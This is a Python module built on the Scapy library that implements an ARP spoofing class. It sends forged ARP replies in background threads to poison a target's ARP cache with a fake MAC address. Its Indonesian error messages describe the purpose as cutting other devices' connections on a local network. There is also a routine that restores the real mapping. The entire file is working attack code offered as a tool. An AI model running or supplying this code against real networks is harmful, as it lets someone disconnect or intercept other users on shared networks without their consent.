import sys
import os
import time
import threading
import logging
from typing import Dict, Optional, Tuple

try:
    from scapy.all import ARP, Ether, sendp, conf
    SCAPY_AVAILABLE = True
except Exception as e:
    SCAPY_AVAILABLE = False
    conf = None

from .host import Host
from .interface import Interface
from .mac_utils import get_random_mac

logger = logging.getLogger(__name__)


def check_l2_support() -> Tuple[bool, str]:
    """Checks whether Layer 2 packet sending is available on this OS."""
    if not SCAPY_AVAILABLE:
        return False, "Pustaka Scapy tidak terinstal."

    if sys.platform == "win32":
        sys32 = os.environ.get("SystemRoot", "C:\\Windows") + "\\System32"
        has_wpcap = (
            os.path.exists(os.path.join(sys32, "wpcap.dll")) or
            os.path.exists(os.path.join(sys32, "Npcap", "wpcap.dll")) or
            os.path.exists(os.path.join(sys32, "drivers", "npcap.sys"))
        )
        if not has_wpcap:
            return False, "Driver Npcap belum terpasang di Windows. Npcap diperlukan untuk mengirim raw packet ARP (Cut connection)."

    return True, "Layer 2 injection siap."


class ARPSpoofer:
    """
    Manages ARP spoofing and recovery operations.
    Handles background spoofing loops and packet crafting.
    """

    def __init__(self, interface: Optional[Interface] = None, attack_interval_s: float = 2.0):
        self.interface = interface
        self.attack_interval_s = attack_interval_s
        self._threads: Dict[Tuple[str, str], threading.Thread] = {}
        self._stop_events: Dict[Tuple[str, str], threading.Event] = {}
        self._fake_macs: Dict[str, str] = {}
        self._last_error: Optional[str] = None
        self._lock = threading.RLock()

    @property
    def last_error(self) -> Optional[str]:
        return self._last_error

    def get_fake_mac(self, host_ip: str) -> str:
        """Returns or generates a persistent fake MAC address for a given host."""
        with self._lock:
            if host_ip not in self._fake_macs:
                self._fake_macs[host_ip] = get_random_mac()
            return self._fake_macs[host_ip]

    def _spoof_loop(self, target: Host, spoof_src: Host, fake_mac: str, stop_event: threading.Event):
        """Background loop continuously sending poisoned ARP replies."""
        if not SCAPY_AVAILABLE:
            self._last_error = "Scapy tidak tersedia."
            return

        if not target.mac_address:
            self._last_error = f"Target {target.ip_address} tidak memiliki MAC address."
            return

        iface_name = self.interface.name if self.interface else None

        try:
            packet = Ether(dst=target.mac_address.lower()) / ARP(
                op=2,  # is-at
                pdst=target.ip_address,
                hwdst=target.mac_address.lower(),
                psrc=spoof_src.ip_address,
                hwsrc=fake_mac.lower()
            )
        except Exception as e:
            self._last_error = f"Error crafting packet: {e}"
            return

        while not stop_event.is_set():
            try:
                if iface_name:
                    sendp(packet, iface=iface_name, verbose=False)
                else:
                    sendp(packet, verbose=False)
            except RuntimeError as re:
                err_msg = str(re)
                self._last_error = err_msg
                logger.error(f"L2 Spoof error: {err_msg}")
                break
            except Exception as e:
                self._last_error = str(e)
                logger.debug(f"Send error in spoof loop: {e}")

            stop_event.wait(self.attack_interval_s)

    def start_spoof(self, target: Host, spoof_src: Host, fake_mac: Optional[str] = None) -> Tuple[bool, str]:
        """Starts an attack thread to poison target's ARP cache."""
        is_supported, msg = check_l2_support()
        if not is_supported:
            self._last_error = msg
            return False, msg

        if not target.mac_address:
            return False, f"MAC address untuk {target.ip_address} belum ditemukan"

        key = (target.ip_address, spoof_src.ip_address)
        with self._lock:
            if key in self._threads and self._threads[key].is_alive():
                return True, "Already running"

            if not fake_mac:
                if spoof_src.ip_address not in self._fake_macs:
                    self._fake_macs[spoof_src.ip_address] = get_random_mac()
                fake_mac = self._fake_macs[spoof_src.ip_address]

            stop_event = threading.Event()
            thread = threading.Thread(
                target=self._spoof_loop,
                args=(target, spoof_src, fake_mac, stop_event),
                daemon=True,
                name=f"Spoof-{target.ip_address}-{spoof_src.ip_address}"
            )
            self._stop_events[key] = stop_event
            self._threads[key] = thread
            thread.start()

        return True, "Spoof started"

    def stop_spoof(self, target: Host, spoof_src: Host, send_recover: bool = True):
        """Stops the attack thread and restores legitimate ARP mapping."""
        key = (target.ip_address, spoof_src.ip_address)
        stop_event = None
        thread = None

        with self._lock:
            if key in self._stop_events:
                stop_event = self._stop_events.pop(key)
            if key in self._threads:
                thread = self._threads.pop(key)

        if stop_event:
            stop_event.set()
        if thread and thread.is_alive():
            thread.join(timeout=0.5)

        if send_recover and SCAPY_AVAILABLE:
            self._send_recover_packet(target, spoof_src)

    def _send_recover_packet(self, target: Host, spoof_src: Host, count: int = 3):
        """Sends legitimate ARP reply packets to restore real MAC."""
        try:
            iface_name = self.interface.name if self.interface else None
            packet = Ether(dst=target.mac_address.lower()) / ARP(
                op=2,  # is-at
                pdst=target.ip_address,
                hwdst=target.mac_address.lower(),
                psrc=spoof_src.ip_address,
                hwsrc=spoof_src.mac_address.lower()
            )
            for _ in range(count):
                if iface_name:
                    sendp(packet, iface=iface_name, verbose=False)
                else:
                    sendp(packet, verbose=False)
                time.sleep(0.02)
        except Exception as e:
            logger.debug(f"Recover packet error: {e}")

    def stop_all(self):
        """Stops all active spoofing threads."""
        keys = list(self._threads.keys())
        for target_ip, spoof_src_ip in keys:
            target = Host(target_ip, "")
            spoof_src = Host(spoof_src_ip, "")
            self.stop_spoof(target, spoof_src, send_recover=False)
